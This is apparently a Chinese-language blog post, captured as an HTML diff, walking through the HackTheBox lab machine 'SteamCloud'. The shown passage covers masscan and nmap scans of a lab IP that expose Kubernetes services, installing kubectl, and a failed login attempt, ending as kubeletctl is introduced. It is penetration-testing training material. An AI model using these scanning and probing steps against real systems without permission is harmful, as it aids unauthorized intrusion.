@@ -1,0 +1,753 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon：masscan：123456789101112&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.133 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-14 10:02:32 GMT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-SteamCloud">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-SteamCloud/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon：masscan：123456789101112&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.133 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-14 10:02:32 GMT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220514182113201.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220514182224229.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220514182427258.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220514193051801.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:37.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220514182113201.png">
+  
+  
+  
+  <title>HackTheBox-SteamCloud - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-SteamCloud"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          163 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-SteamCloud</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><h5 id="masscan："><a href="#masscan：" class="headerlink" title="masscan："></a>masscan：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.133 --rate 2000 -e tun0<br>[sudo] mosaictheory 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-14 10:02:32 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.133                                    <br>Discovered open port 2379/tcp on 10.10.11.133                                  <br>Discovered open port 10256/tcp on 10.10.11.133                                 <br>Discovered open port 8443/tcp on 10.10.11.133                                  <br>Discovered open port 10249/tcp on 10.10.11.133                                 <br>Discovered open port 10250/tcp on 10.10.11.133                                 <br>Discovered open port 2380/tcp on 10.10.11.133 <br></code></pre></td></tr></table></figure>
+
+<h5 id="Nmap："><a href="#Nmap：" class="headerlink" title="Nmap："></a>Nmap：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo nmap -sC -sV -Pn 10.10.11.133 -p22,2379,10256,8443,10249,1250,2380<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.133<br>Host is up (0.33s latency).<br><br>PORT      STATE  SERVICE          VERSION<br>22/tcp    open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">fc</span>:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)<br>|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)<br>|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)<br>1250/tcp  closed swldy-sias<br>2379/tcp  open   ssl/etcd-client?<br>| ssl-cert: Subject: commonName=steamcloud<br>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1<br>| Not valid before: 2022-05-14T10:02:00<br>|_Not valid after:  2023-05-14T10:02:00<br>| tls-alpn: <br>|_  h2<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>2380/tcp  open   ssl/etcd-server?<br>| tls-alpn: <br>|_  h2<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=steamcloud<br>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1<br>| Not valid before: 2022-05-14T10:02:00<br>|_Not valid after:  2023-05-14T10:02:01<br>8443/tcp  open   ssl/https-alt<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: 259e34c0-7408-465b-bb52-13e9b6c3a1bd<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:08 GMT<br>|     Content-Length: 212<br>|     &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot get path &quot;</span>/nice ports,/Trinity.txt.bak<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|   GetRequest: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: f6ce1760-50c1-44b5-8c1c-f24c8126a46c<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:05 GMT<br>|     Content-Length: 185<br>|     &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot get path &quot;</span>/<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|   HTTPOptions: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: 786acb3a-4dbc-4702-909f-b97968ee50a7<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:07 GMT<br>|     Content-Length: 189<br>|_    &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot options path &quot;</span>/<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (application/json).</span><br><span class="hljs-string">| tls-alpn: </span><br><span class="hljs-string">|   h2</span><br><span class="hljs-string">|_  http/1.1</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=minikube/organizationName=system:masters</span><br><span class="hljs-string">| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1</span><br><span class="hljs-string">| Not valid before: 2022-05-13T10:01:57</span><br><span class="hljs-string">|_Not valid after:  2025-05-13T10:01:57</span><br><span class="hljs-string">10249/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/plain; charset=utf-8).<br>10256/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/plain; charset=utf-8).</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=5/14%Time=627F7F0D%P=x86_64-pc-linux-gn</span><br><span class="hljs-string">SF:u%r(GetRequest,22F,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20f6ce1</span><br><span class="hljs-string">SF:760-50c1-44b5-8c1c-f24c8126a46c\r\nCache-Control:\x20no-cache,\x20priva</span><br><span class="hljs-string">SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n</span><br><span class="hljs-string">SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2002934147-5409-4441-b7e6-63</span><br><span class="hljs-string">SF:88d55f4dd4\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2087805fbd-eebb-4063-</span><br><span class="hljs-string">SF:b814-3d599d9f6cca\r\nDate:\x20Sat,\x2014\x20May\x202022\x2010:06:05\x20</span><br><span class="hljs-string">SF:GMT\r\nContent-Length:\x20185\r\n\r\n&#123;\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\</span><br><span class="hljs-string">SF:&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;:&#123;&#125;,\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden</span><br><span class="hljs-string">SF::\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/</span><br><span class="hljs-string">SF:\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:&#123;&#125;,\&quot;code\&quot;:403&#125;\n&quot;)%r(HTTP</span><br><span class="hljs-string">SF:Options,233,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20786acb3a-4db</span><br><span class="hljs-string">SF:c-4702-909f-b97968ee50a7\r\nCache-Control:\x20no-cache,\x20private\r\nC</span><br><span class="hljs-string">SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\</span><br><span class="hljs-string">SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x2002934147-5409-4441-b7e6-6388d55f4</span><br><span class="hljs-string">SF:dd4\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2087805fbd-eebb-4063-b814-3d</span><br><span class="hljs-string">SF:599d9f6cca\r\nDate:\x20Sat,\x2014\x20May\x202022\x2010:06:07\x20GMT\r\n</span><br><span class="hljs-string">SF:Content-Length:\x20189\r\n\r\n&#123;\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;v1\</span><br><span class="hljs-string">SF:&quot;,\&quot;metadata\&quot;:&#123;&#125;,\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x20Us</span><br><span class="hljs-string">SF:er\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20options\x20path\x20\\\&quot;/\\\</span><br><span class="hljs-string">SF:&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:&#123;&#125;,\&quot;code\&quot;:403&#125;\n&quot;)%r(FourOhF</span><br><span class="hljs-string">SF:ourRequest,24A,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20259e34c0-</span><br><span class="hljs-string">SF:7408-465b-bb52-13e9b6c3a1bd\r\nCache-Control:\x20no-cache,\x20private\r</span><br><span class="hljs-string">SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni</span><br><span class="hljs-string">SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2002934147-5409-4441-b7e6-6388d5</span><br><span class="hljs-string">SF:5f4dd4\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2087805fbd-eebb-4063-b814</span><br><span class="hljs-string">SF:-3d599d9f6cca\r\nDate:\x20Sat,\x2014\x20May\x202022\x2010:06:08\x20GMT\</span><br><span class="hljs-string">SF:r\nContent-Length:\x20212\r\n\r\n&#123;\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;</span><br><span class="hljs-string">SF:v1\&quot;,\&quot;metadata\&quot;:&#123;&#125;,\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x2</span><br><span class="hljs-string">SF:0User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/nice</span><br><span class="hljs-string">SF:\x20ports,/Trinity\.txt\.bak\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;</span><br><span class="hljs-string">SF::&#123;&#125;,\&quot;code\&quot;:403&#125;\n&quot;);</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 150.10 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>kubernetes我第一次接触，我尝试寻找官方文档：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kubernetes.io<span class="hljs-regexp">/docs/</span>concepts<span class="hljs-regexp">/overview/</span>what-is-kubernetes/<br></code></pre></td></tr></table></figure>
+
+<p>2379端口是https协议，但是如果我尝试访问，会拒绝我，并且一直是我最初浏览器提示的证书不可信的警告。2380也是如此：</p>
+<img src="https://www.worldisend.com/img/image-20220514182113201.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514182113201" style="zoom:200%;" />
+
+<p>8443会自动为我弹出一些信息，看来是不允许匿名用户访问：</p>
+<img src="https://www.worldisend.com/img/image-20220514182224229.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514182224229" style="zoom:200%;" />
+
+<p>10249与10256是一样的：</p>
+<img src="https://www.worldisend.com/img/image-20220514182427258.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514182427258" style="zoom:200%;" />
+
+<h4 id="kubernetes初探："><a href="#kubernetes初探：" class="headerlink" title="kubernetes初探："></a>kubernetes初探：</h4><h5 id="Kubectl："><a href="#Kubectl：" class="headerlink" title="Kubectl："></a>Kubectl：</h5><p>触及知识盲区了，幸好我在官方文档里找到了这个：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kubernetes.io<span class="hljs-regexp">/docs/</span>tasks<span class="hljs-regexp">/tools/</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220514193051801.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514193051801" style="zoom:200%;" />
+
+<p>或许我可以试着用该工具去管理目标，即使按经验来讲这种功能要用户名密码认证而我什么都没有，可通过命令进行下载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>下载完后再下载校验工具进行校验：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl.sha256&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(cat kubectl.sha256)</span>  kubectl&quot;</span> | <span class="hljs-built_in">sha256sum</span> --check<br>kubectl: 成功<br></code></pre></td></tr></table></figure>
+
+<p>通过如下命令进行安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl<br></code></pre></td></tr></table></figure>
+
+<p>查看信息，安装成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl version --client --output=yaml   <br>clientVersion:<br>  buildDate: <span class="hljs-string">&quot;2022-05-03T13:46:05Z&quot;</span><br>  compiler: gc<br>  gitCommit: 4ce5a8954017644c5420bae81d72b09b735c21f0<br>  gitTreeState: clean<br>  gitVersion: v1.24.0<br>  goVersion: go1.18.1<br>  major: <span class="hljs-string">&quot;1&quot;</span><br>  minor: <span class="hljs-string">&quot;24&quot;</span><br>  platform: linux/amd64<br>kustomizeVersion: v4.5.4<br></code></pre></td></tr></table></figure>
+
+<p>但是我尝试链接目标，果不其然的都要用户名和密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo kubectl --server https://10.10.11.133:10249  get pod<br>Please enter Username: admin<br>Please enter Password: <br>Unable to connect to the server: http: server gave HTTP response to HTTPS client<br></code></pre></td></tr></table></figure>
+
+<h5 id="kubeletctl："><a href="#kubeletctl：" class="headerlink" title="kubeletctl："></a>kubeletctl：</h5><p>这总不能让我硬猜吧。接着Google帮我找到了这个：</p>
